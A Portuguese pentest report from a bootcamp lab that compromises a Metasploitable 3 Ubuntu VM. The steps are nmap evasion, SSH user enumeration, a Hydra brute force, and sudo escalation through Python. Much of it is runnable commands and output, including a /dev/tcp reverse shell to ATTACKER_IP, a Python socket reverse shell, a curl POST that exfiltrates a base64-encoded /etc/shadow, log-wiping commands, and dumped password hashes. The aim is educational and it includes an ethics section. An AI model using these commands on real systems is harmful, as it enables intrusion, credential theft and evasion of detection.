# Relatório de pentesting Metasploitable 3 Ubuntu

## Resumo executivo

Este relatório documenta o teste de penetração realizado em um servidor Ubuntu Metasploitable 3 no ambiente de laboratório do bootcamp do Banco Santander. O objetivo foi identificar vulnerabilidades, explorar serviços e demonstrar metodologias de segurança ofensiva em um ambiente controlado.

**Data do Teste:** 23 de Outubro de 2025

**Alvo:** 192.168.56.3 (Ubuntu 14.04 LTS)

**Status:** Comprometido com sucesso

---

## 1. Introdução e metodologia

### 1.1 Abordagem de scanning

Geralmente inicio scans de maneiras bem furtivas, pois sinceramente não existe pentest verdadeiramente silencioso. Considerando que este é um alvo totalmente vulnerável (Metasploitable), no primeiro momento consigo testar questões fundamentais de segurança.

Porém, em ambientes reais com simulações de pentest, optaria por utilizar métodos para ofuscar minhas ações, como **proxychains** antes do prefixo das ferramentas:

```bash
proxychains nmap -sS 192.168.56.3
proxychains msfconsole
```

### 1.2 Técnicas de ofuscação no nmap

Para maior expansão de possibilidades e ofuscação, utilizo configurações avançadas do nmap com decoys:

```bash
# Exemplo: Escanear usando múltiplos decoys (ip1, ip2, etc)
# O servidor receberá requisições de múltiplos IPs, dificultando identificação do atacante real
nmap -D 192.168.1.100,192.168.1.101,ME -p- 192.168.56.3

# Outras técnicas:
# Fragmentação de pacotes
nmap -f 192.168.56.3

# Timing evasion (paranoid mode)
nmap -T1 192.168.56.3

# Source port spoofing
nmap --source-port 53 192.168.56.3
```

---

## 2. Resumo de vulnerabilidades encontradas

Comando utilizado na labs.

```bash
nmap -n -Pn -sT -sV --script vuln --reason -oA metspl-ubu 192.168.56.3
```

O que não falta é vulnerabilidades para serem exploradas. Como é um Metasploitable, sabemos que é um servidor propositalmente vulnerável. Em ambientes reais, pode ser até mesmo um honeypot configurado.

| Porta | Serviço        | Versão | Vulnerabilidade                                 | Severidade         |
| ----- | --------------- | ------- | ----------------------------------------------- | ------------------ |
| 21    | ProFTPD         | 1.3.5   | CVE-2015-3306 (RCE via mod_copy)                | **CRÍTICA** |
| 22    | OpenSSH         | 6.6.1p1 | CVE-2020-15778, CVE-2016-10012                  | Alta               |
| 80    | Apache          | 2.4.7   | Múltiplas CVEs, SQL Injection, CSRF, Slowloris | Alta               |
| 445   | Samba           | 3.X-4.X | SMB DoS, possível RCE                          | Média             |
| 631   | CUPS            | 1.7     | CVE-2014-5031 (bypass autenticação)           | Média             |
| 3306  | MySQL           | -       | Sem autenticação, acesso direto               | **CRÍTICA** |
| 8080  | Jetty/Continuum | 8.1.7   | Slowloris, CSRF, Credentials Padrão            | Alta               |

---

## 3. Exploração - SSH (Porta 22) - OpenSSH 6.6.1p1

### 3.1 Vulnerabilidades identificadas

OpenSSH 6.6.1p1 possui múltiplos CVEs incluindo CVE-2020-15778 e CVE-2016-10012. Como vimos no resultado do scan, o próprio nmap sugere exploração via msfconsole.

Devido ser vulnerabilidade de alta criticidade, a estratégia foi: explorar o searchsploit para encontrar a CVE, ou consultar na web informações sobre referências de exploits. Nesse exemplo foi utilizado `ssh_enumusers`.

### 3.2 Passo 1: Enumeração de usuários com Metasploit

Realizei enumeração de usuários válidos no SSH usando o módulo ssh_enumusers:

```bash
msfconsole
msf > use auxiliary/scanner/ssh/ssh_enumusers
[*] Setting default action Malformed Packet - view all 2 actions with the show actions command

msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.56.3
rhosts => 192.168.56.3

msf auxiliary(scanner/ssh/ssh_enumusers) > set check_false false
check_false => false

msf auxiliary(scanner/ssh/ssh_enumusers) > set user_file /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
user_file => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

msf auxiliary(scanner/ssh/ssh_enumusers) > run
```

**Resultado obtido:**

```
[*] 192.168.56.3:22 - SSH - Using malformed packet technique
[*] 192.168.56.3:22 - SSH - Starting scan
[+] 192.168.56.3:22 - SSH - User 'root' found
[+] 192.168.56.3:22 - SSH - User 'admin' found
[+] 192.168.56.3:22 - SSH - User 'test' found
[+] 192.168.56.3:22 - SSH - User 'guest' found
[+] 192.168.56.3:22 - SSH - User 'info' found
[+] 192.168.56.3:22 - SSH - User 'adm' found
[+] 192.168.56.3:22 - SSH - User 'mysql' found
[+] 192.168.56.3:22 - SSH - User 'user' found
[+] 192.168.56.3:22 - SSH - User 'administrator' found
[+] 192.168.56.3:22 - SSH - User 'oracle' found
[+] 192.168.56.3:22 - SSH - User 'ftp' found
[+] 192.168.56.3:22 - SSH - User 'pi' found
[+] 192.168.56.3:22 - SSH - User 'puppet' found
[+] 192.168.56.3:22 - SSH - User 'ansible' found
[+] 192.168.56.3:22 - SSH - User 'ec2-user' found
[+] 192.168.56.3:22 - SSH - User 'vagrant' found
[+] 192.168.56.3:22 - SSH - User 'azureuser' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Explicação:** Utilizei a técnica de malformed packet para explorar a temporização na resposta SSH. Quando o SSH recebe um usuário válido, ele responde diferente comparado a um usuário inválido. Isso permite enumerar usuários sem fazer brute force de senha.

### 3.3 Passo 2: Brute Force de senha com Hydra

Após a enumeração, obtive uma lista de usuários possíveis. Minha estratégia foi começar com listas menores. Caso não conseguisse, iria subindo o nível das listas. Costumo sempre utilizar wordlists de usernames e passwords de acordo com o idioma do alvo.

Em um teste black box, utilizaria campanhas de phishing, keyloggers e outras possibilidades para atingir o objetivo. Por preferência, utilizei o Hydra para brute-force. Como já obtive os usernames, utilizei apenas o usuário "vagrant":

```bash
hydra -l vagrant -P /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt ssh://192.168.56.3 -t 4
```

**Resultado obtido:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 21:28:18
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 17 login tries (l:1/p:17), ~5 tries per task
[DATA] attacking ssh://192.168.56.3:22/
[22][ssh] host: 192.168.56.3   login: vagrant   password: vagrant
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 21:28:37
```

**Explicação:** O Hydra conseguiu encontrar a senha "vagrant" para o usuário "vagrant" em aproximadamente 19 segundos. Isso demonstra o quão fraco é usar credentials idênticas (usuario:usuario).

### 3.4 Passo 3: Acesso SSH ao alvo

Com as credenciais válidas (vagrant:vagrant), realizei login no SSH:

```bash
ssh vagrant@192.168.56.3
```

**Output do acesso:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vagrant@192.168.56.3's password:
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

* Documentation:  https://help.ubuntu.com/
  Last login: Thu Oct 23 21:00:57 2025 from 192.168.56.1

vagrant@ubuntu:~$
```

**Verificação de acesso inicial:**

```bash
vagrant@ubuntu:~$ whoami
vagrant

vagrant@ubuntu:~$ id
uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo)
```

**Explicação:** Consegui acesso com usuário comum (vagrant). Notar que este usuário está no grupo `sudo`, o que é crucial para escalação de privilégio.

### 3.5 Passo 4: Escalação de privilégio  [análise de Sudo]

Como o usuário vagrant está no grupo sudoers, realizei verificação das permissões:

```bash
vagrant@ubuntu:~$ sudo -l
```

**Resultado obtido:**

```
Matching Defaults entries for vagrant on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"

User vagrant may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

**Explicação:** O usuário vagrant pode executar qualquer comando com sudo sem necessidade de senha. Isto é uma configuração extremamente perigosa! Isso abre múltiplas vetores de escalação.

### 3.5a Método 1: Escalação direta com `sudo su`

O método mais simples, mas "sem graça", seria:

```bash
vagrant@ubuntu:~$ sudo su -
root@ubuntu:~#
```

Porém, explorei o potencial do Python de forma mais interessante.

### 3.5b Método 2: Python RCE com `os.system()`

Identifiquei que python está disponível com permissão de sudo. Explorei o módulo `os` para ganhar controle total:

```bash
vagrant@ubuntu:~$ sudo python -c 'import os; os.system("/bin/sh")'
```

**Resultado obtido:**

```
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explicação:** Ao invocar `/bin/sh` dentro do Python com permissões elevadas (sudo), obtive uma shell root com acesso completo. Python executa comandos do sistema mantendo os privilégios de sudo.

### 3.5c Método 3: Python com importação de módulos maliciosos

Uma abordagem mais sofisticada seria criar um módulo Python malicioso e importá-lo com sudo:

```bash
# Na máquina do atacante, criar módulo malicioso
cat > evil.py << 'EOF'
import os
import subprocess

# Executar comando com privilégios
os.system("cat /etc/shadow > /tmp/shadow_output.txt")
os.system("chmod 644 /tmp/shadow_output.txt")

# Ou abrir um reverse shell
subprocess.call(["bash", "-i", ">& /dev/tcp/ATTACKER_IP/PORT 0>&1"], shell=True)
EOF

# Transferir para o alvo
scp evil.py vagrant@192.168.56.3:/tmp/

# Executar no alvo com sudo
vagrant@ubuntu:~$ sudo python /tmp/evil.py
```

**Explicação:** Python permite importar e executar código arbitrário. Com sudo, podemos fazer praticamente qualquer coisa no sistema.

### 3.5d Método 4: Python com `subprocess` [Mais Robusto]

Uma forma mais robusta e profissional de ganhar shell:

```bash
vagrant@ubuntu:~$ sudo python -c 'import subprocess; subprocess.call(["/bin/bash"])'
```

**Resultado:**

```
root@ubuntu:~# whoami
root

root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explicação:** `subprocess.call()` fornece mais controle sobre a execução. Funciona melhor em shells interativos do que `os.system()`.

### 3.5e Método 5: Python com socket - Reverse shell profissional

Para uma sessão de shell mais confiável e que funciona remotamente:

```bash
# No atacante, abrir listener netcat
nc -lvnp 4444

# No alvo, executar Python com reverse shell
vagrant@ubuntu:~$ sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/bash","-i"]);p.wait()'
```

**Resultado esperado (no atacante):**

```
listening on [any] 4444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.3] 54321
root@ubuntu:~# whoami
root
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explicação:** Isso cria um reverse shell onde o alvo se conecta de volta ao atacante com shell root. Muito mais útil do que uma shell local, pois permite execução remota persistente.

### 3.5f Método 6: Python para exfiltração de dados com priv escalada

Usar Python para automatizar a exfiltração de dados sensíveis:

```bash
vagrant@ubuntu:~$ sudo python << 'PYTHON_EOF'
import os
import subprocess
import base64

# Ler arquivo sensível
with open('/etc/shadow', 'r') as f:
    shadow_content = f.read()

# Base64 encode para evitar caracteres estranhos
encoded = base64.b64encode(shadow_content.encode()).decode()

# Enviar para servidor atacante via curl
os.system(f'curl -X POST http://192.168.56.1:8000 -d "data={encoded}"')

# Ou salvar com permissões ajustadas
os.system('cat /etc/shadow > /tmp/shadow_backup.txt && chmod 777 /tmp/shadow_backup.txt')
print("[+] Arquivo copiado e permissões alteradas com sucesso!")
PYTHON_EOF
```

**Explicação:** Python permite combinar leitura de arquivo (com privilégios root) + processamento de dados + envio remoto automatizado.

### 3.5g Método 7: Python com `pty` - shell completamente interativa

Para uma shell 100% interativa com histórico e tudo:

```bash
vagrant@ubuntu:~$ sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

**Resultado:**

```
root@ubuntu:~# export TERM=xterm
root@ubuntu:~# whoami
root
root@ubuntu:~# clear
root@ubuntu:~# 
```

**Explicação:** `pty.spawn()` cria um pseudo-terminal, permitindo uso de comandos como `clear`, histórico com setas, autocomplete, etc. Bem mais confortável que shell simples.

---

## 4. Transferência de arquivos sensíveis

### 4.1 Cópia de /etc/shadow

Após ganhar acesso root, realizei cópia do arquivo `/etc/shadow` para análise posterior:

```bash
# whoami
root

# cp /etc/shadow /home/vagrant/shd.copy
# chown vagrant:vagrant /home/vagrant/shd.copy
```

**Explicação:** Copiei o arquivo shadow (que contém os hashes de senha) para o diretório do usuário vagrant com permissão adequada para leitura. Isso permite transferência via SCP.

### 4.2 Download via SCP

Utilizei SCP para transferir o arquivo do alvo para minha máquina:

```bash
scp vagrant@192.168.56.3:/home/vagrant/shd.copy /home/user
```

**Resultado obtido:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
vagrant@192.168.56.3's password:
shd.copy                                    100% 1841     2.4MB/s   00:00
```

**Explicação:** O arquivo foi transferido com sucesso. O aviso sobre pós-quantum cryptography é relevante apenas para dados de longa duração.

### 4.3 Análise do arquivo /etc/shadow

Após baixar, analisei o arquivo obtido:

```
root:!:18564:0:99999:7:::
daemon:*:16176:0:99999:7:::
bin:*:16176:0:99999:7:::
sys:*:16176:0:99999:7:::
sync:*:16176:0:99999:7:::
games:*:16176:0:99999:7:::
man:*:16176:0:99999:7:::
lp:*:16176:0:99999:7:::
mail:*:16176:0:99999:7:::
news:*:16176:0:99999:7:::
uucp:*:16176:0:99999:7:::
proxy:*:16176:0:99999:7:::
www-data:*:16176:0:99999:7:::
backup:*:16176:0:99999:7:::
list:*:16176:0:99999:7:::
irc:*:16176:0:99999:7:::
gnats:*:16176:0:99999:7:::
nobody:*:16176:0:99999:7:::
libuuid:!:16176:0:99999:7:::
syslog:*:18564:0:99999:7:::
messagebus:*:18564:0:99999:7:::
sshd:*:18564:0:99999:7:::
statd:*:18564:0:99999:7:::
vagrant:$6$NABMNgxO$T2lvEhArjOImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ES
K5LjFJymb2jo/m4NmDg8aEl0TWWI3la.Y3/:18564:0:99999:7:::
dirmngr:*:18564:0:99999:7:::
leia_organa:$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/:18564:0:99999:7:::
luke_skywalker:$1$/7D55Ozb$Y/aKb.UNrDS2w7nZVq.Ll/:18564:0:99999:7:::
han_solo:$1$6jIF3qTC$7jEXfQsNENuWYeO6cK7m1.:18564:0:99999:7:::
artoo_detoo:$1$tfvzyRnv$mawnXAR4GgABt8rtn7Dfv.:18564:0:99999:7:::
c_three_pio:$1$lXx7tKuo$xuM4AxkByTUD78BaJdYdG.:18564:0:99999:7:::
ben_kenobi:$1$5nfRD/bA$y7ZZD0NimJTbX9FtvhHJX1:18564:0:99999:7:::
darth_vader:$1$rLuMkR1R$YHumHRxhswnfO7eTUUfHJ.:18564:0:99999:7:::
anakin_skywalker:$1$jlpeszLc$PW4IPiuLTwiSH5YaTlRaB0:18564:0:99999:7:::
jarjar_binks:$1$SNokFi0c$F.SvjZQjYRSuoBuobRWMh1:18564:0:99999:7:::
lando_calrissian:$1$Af1ek3xT$nKc8jkJ30gMQWeW/6.ono0:18564:0:99999:7:::
boba_fett:$1$TjxlmV4j$k/rG1vb4.pj.z0yFWJ.ZD0:18564:0:99999:7:::
jabba_hutt:$1$9rpNcs3v$//v2ltj5MYhfUOHYVAzjD/:18564:0:99999:7:::
greedo:$1$vOU.f3Tj$tsgBZJbBS4JwtchsRUW0a1:18564:0:99999:7:::
chewbacca:$1$.qt4t8zH$RdKbdafuqc7rYiDXSoQCI.:18564:0:99999:7:::
kylo_ren:$1$rpvxsssI$hOBC/qL92d0GgmD/uSELx.:18564:0:99999:7:::
mysql:!:18564:0:99999:7:::
avahi:*:18564:0:99999:7:::
colord:*:18564:0:99999:7:::
```

**Explicação:** O arquivo shadow contém os hashes de senha. Identifiquei vários usuários com senhas (hashes MD5 e SHA512), incluindo usuários de exemplo do Star Wars. Esses hashes podem ser cracked com ferramentas como John the Ripper ou Hashcat para obter as senhas em texto plano.

### 4.4 Análise de hashes e cracking

Os usuários interessantes encontrados:

```
vagrant:$6$NABMNgxO$...  (SHA512 - usuário com acesso)
leia_organa:$1$N6DIbGGZ$...  (MD5 - senha facilmente crackável)
luke_skywalker:$1$/7D55Ozb$...  (MD5)
han_solo:$1$6jIF3qTC$...  (MD5)
darth_vader:$1$rLuMkR1R$...  (MD5)
```

**Explicação:** Esses hashes podem ser testados contra dicionários de senha. Considerando os nomes (personagens de Star Wars), as senhas provavelmente estão relacionadas.

---

## 5. Enumeração adicional do sistema

Para um mapa completo das informações sensíveis, recomenda-se utilizar ferramentas como  **linpeas.sh** :

```bash
# Transferir linpeas para o alvo
scp /opt/tools/linpeas.sh vagrant@192.168.56.3:/tmp/

# Executar no alvo
ssh vagrant@192.168.56.3 "bash /tmp/linpeas.sh > /tmp/linpeas_output.txt"

# Baixar resultado
scp vagrant@192.168.56.3:/tmp/linpeas_output.txt /home/user/
```

**Benefícios:** Linpeas fornece um relatório completo sobre:

* Possíveis vetores de escalação de privilégio
* Configurações de segurança incorretas
* Arquivos sensíveis
* Processos rodando
* Usuários e permissões

---

## 6. Ética, Legalidade e Pós-Exploração

### 6.1 Distinção crítica: Pentesting ético vs. operações maliciosas

É fundamental destacar que existem **dois caminhos completamente diferentes** após ganhar acesso a um sistema:

#### **Pentesting ético**

Em um teste de penetração autorizado e ético, o foco é  **exclusivamente na documentação** :

```bash
# O pentester ético faz:

1. Documentar exatamente o que foi explorado
   ├── Tipo de vulnerabilidade
   ├── Vetor de ataque
   ├── Impacto potencial
   └── Evidências capturadas

2. Preparar relatório detalhado
   ├── Screenshots/logs da exploração
   ├── Passo a passo reprodutível
   ├── CVSS scores e severidade
   └── Referências de vulnerabilidades

3. Recomendações de correção
   ├── Patches e atualizações
   ├── Mudanças de configuração
   ├── Políticas de segurança
   └── Treinamento de staff

4. Restaurar o sistema
   ├── Não deixar nenhum artefato
   ├── Não instalar backdoors
   ├── Não modificar dados
   └── Deixar ambiente idêntico ao inicial
```

**Resultado esperado:** Um cliente satisfeito, vulnerabilidades corrigidas e confiança reforçada.

#### **Operações maliciosas (Caminho errado - apenas para educação)**

O Brasil tipificou como crimes os atos de destruição, alteração e apagamento de dados através da Lei nº 12.737/2012 (Lei Carolina Dieckmann), que foi posteriormente intensificada pela Lei nº 14.155/2021, aumentando as penas para reclusão de 1 a 4 anos para invasão de dispositivo informático com fim de obter, adulterar ou destruir dados ou informações. [L12737](https://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm "LEI Nº 12.737, DE 30 DE NOVEMBRO DE 2012.") | [L14155](https://www.planalto.gov.br/ccivil_03/_ato2019-2022/2021/lei/l14155.htm "LEI Nº 14.155, DE 27 DE MAIO DE 2021")

Um atacante malicioso seguiria caminho completamente diferente:

```bash
# O atacante malicioso faria (APENAS EXEMPLO EDUCACIONAL):

1. Implantar backdoors para persistência
   ├── Modificar /root/.ssh/authorized_keys
   ├── Instalar webshells em diretórios web
   ├── Criar cronjobs para reverse shells
   └── Modificar SSH para aceitar backdoor keys

2. Cobrir rastros eliminando logs
   ├── rm -rf /var/log/* (remover logs do sistema)
   ├── cat /dev/null > /var/log/auth.log
   ├── history -c && history -w (limpar histórico bash)
   ├── Modificar timestamps de arquivos (touch -t)
   └── Usar ferramentas como 'shred' ou 'srm'

3. Exfiltrar dados sensíveis
   ├── Copiar bancos de dados inteiros
   ├── Coletar credenciais criptografadas
   ├── Fazer snapshots de dados do cliente
   └── Vender ou usar para chantagem

4. Manter acesso silencioso
   ├── Instalar rootkit
   ├── Comprometer outros hosts na rede
   ├── Estabelecer C&C (Command & Control)
   └── Aguardar oportunidade de ataque maior
```

**Resultado esperado:** Comprometimento de dados, perda financeira, processos legais e prisão.

### 6.2 Por que o caminho ético é o único viável

**Legal:**

* Pentesting autorizado é **100% legal** quando há contrato
* Operações maliciosas são **crimes federais** em praticamente todas as jurisdições
* Lei 14.155 (Brasil) - Crime de invasão de sistemas: até 2 anos de cadeia

**Profissional:**

* Pentestings éticos abrem portas para carreiras bem remuneradas
* Hackers maliciosos vivem na clandestinidade
* Certificações (OSCP, CEH, GPEN) exigem código de ética

**Pessoal:**

* Deixar rastros digitais é praticamente impossível em 2025
* Agências como FBI, INTERPOL, NSA rastreiam ataques
* Um backdoor pode levar anos para ser descoberto - mas será descoberto

### 6.3 A importância do reconhecimento (Reconnaissance)

**"Hacking é um exercício de imaginação e estratégia"** - quanto melhor o mapeamento, melhor a exploração.

A fase de reconhecimento é **80% do trabalho** em um pentesting real:

```bash
# Fase 1: Reconnaissance (Mapeamento Completo)
├── Passive Reconnaissance
│   ├── OSINT (Open Source Intelligence)
│   ├── Social Engineering
│   ├── Coleta de dados públicos
│   └── Análise de metadados
│
├── Active Reconnaissance
│   ├── Scanning de rede (Nmap)
│   ├── Enumeração de serviços
│   ├── Descoberta de aplicações
│   ├── Fingerprinting de versões
│   └── Identificação de tecnologias
│
└── Resultado: MAPA COMPLETO DO ALVO
    ├── Todos os serviços rodando
    ├── Todas as versões identificadas
    ├── Todas as possíveis vulnerabilidades
    ├── Cadeia de ataque potencial
    └── Priorização de exploração

# Fase 2: Exploitation (Com Terreno Mapeado)
├── Escolher vetor mais provável
├── Executar com confiança
├── Backup plan se falhar
└── Sucesso praticamente garantido
```

**Por que importa:**

* Sem mapa completo = tentativa e erro = barulho = detecção
* Com mapa completo = execução limpa = sem alertas = sucesso

### 6.4 O que você pode imaginar, pode ser testado

Dentro de um contrato de pentesting autorizado:

```
 PERMITIDO                            NÃO PERMITIDO
├─ Explorar vulnerabilidades         ├─ Modificar dados do cliente
├─ Escalação de privilégio           ├─ Implantar malware
├─ Acesso a dados sensíveis          ├─ Causar indisponibilidade
├─ Teste de segurança física         ├─ Extorção ou chantagem
├─ Social engineering autorizado     ├─ Venda de informações
├─ Teste de engenharia reversa       ├─ Retenção de dados
└─ Documentação completa             └─ Qualquer ato malicioso
```

Em um pentest real, você pode:

```bash
# Exemplo: Testar persistência de backdoor (AUTORIZADO)
# Inserir script de inicialização que chama reverse shell
# Documentar: "Backdoor permaneceu ativo por X dias sem detecção"
# Objetivo: Demonstrar necessidade de monitoring melhorado

# Exemplo: Testar limpeza de logs (AUTORIZADO)
# Documentar quais logs foram deletados e qual foi o método
# Objetivo: Melhorar proteção de logs e implementar syslog remoto

# Exemplo: Testar movimentação lateral (AUTORIZADO)
# Depois de compromissão, tentar acessar outros hosts
# Objetivo: Revelar fraqueza na segmentação de rede
```

### 6.5 Fases pós-exploração em pentesting ético

```bash
# Dentro do período autorizado:

1. Enumeração Completa
   ├── Dados sensíveis encontrados
   ├── Configurações incorretas
   ├── Versões vulneráveis
   └── Cadeia de ataque demonstrada

2. Demonstração de Impacto
   ├── "Poderia ter deletado database"
   ├── "Teria acesso a dados de clientes"
   ├── "Poderia usar como ponto de pivoting"
   └── Sem na verdade fazer essas coisas

3. Documentação Forense
   ├── Screenshots de cada passo
   ├── Comandos executados
   ├── Timings e sequência
   └── Prova clara de exploração

4. Limpeza Completa
   ├── Remover ferramentas usadas
   ├── Desfazer modificações
   ├── Verificar integridade do sistema
   └── Assinado e documentado
```

### 6.6 Filosofia do pentester ético

```
"A verdadeira medida de um pentester não é quantas vulnerabilidades 
ele consegue explorar, mas quantas vulnerabilidades ele consegue 
documentar e ajudar a corrigir de forma responsável e legal."

- Código de Ética do Pentesting Profissional
```

**Os melhores hackers são:**

* Éticos dentro do framework autorizado
* Criativos na exploração imaginativa
* Detalhistas na documentação
* Responsáveis na divulgação
* Educadores na comunicação

**Os piores hackers são:**

* Criminosos perseguidos
* Prisioneiros federais
* Banidos da indústria
* Sem emprego legal possível
* Vivendo em paranoia constante

---

## 7. Conclusão e recomendações

### 7.1 O Que foi alcançado

Enumeração bem-sucedida de usuários SSH

Descoberta de credenciais fracas

Acesso inicial ao sistema

Escalação para privilégio root

Extração de dados sensíveis

Acesso completo ao servidor

### 7.2 Vulnerabilidades críticas identificadas

1. **SSH com credenciais fracas:** Senha igual ao usuário
2. **Configuração de sudo insegura:** Python executável sem senha
3. **Sem proteção de arquivo shadow:** Acesso direto ao arquivo de hashes
4. **Múltiplos serviços vulneráveis:** FTP, MySQL, Apache, etc.

### 7.3 Recomendações de melhoria

| Vulnerabilidade        | Recomendação                                                                       |
| ---------------------- | ------------------------------------------------------------------------------------ |
| SSH fraco              | Implementar autenticação por chave SSH, desabilitar login por senha                |
| Sudo inseguro          | Revisar `/etc/sudoers`, remover acesso desnecessário, exigir NOPASSWD com cuidado |
| Permissões de arquivo | Proteger `/etc/shadow`com permissões restritas (000)                              |
| Serviços antigos      | Atualizar OpenSSH, Apache, ProFTPD, MySQL para versões atuais                       |
| Monitoramento          | Implementar IDS/IPS, logging centralizado, alertas de segurança                     |
| Política de senhas    | Exigir senhas complexas, implementar 2FA/MFA                                         |
| Scanning seguro        | Fazer testes de penetração autorizados periodicamente                              |

---

**Documento preparado para:** Bootcamp Banco Santander

**Classificação:** Educacional - Ambiente de Laboratório Controlado
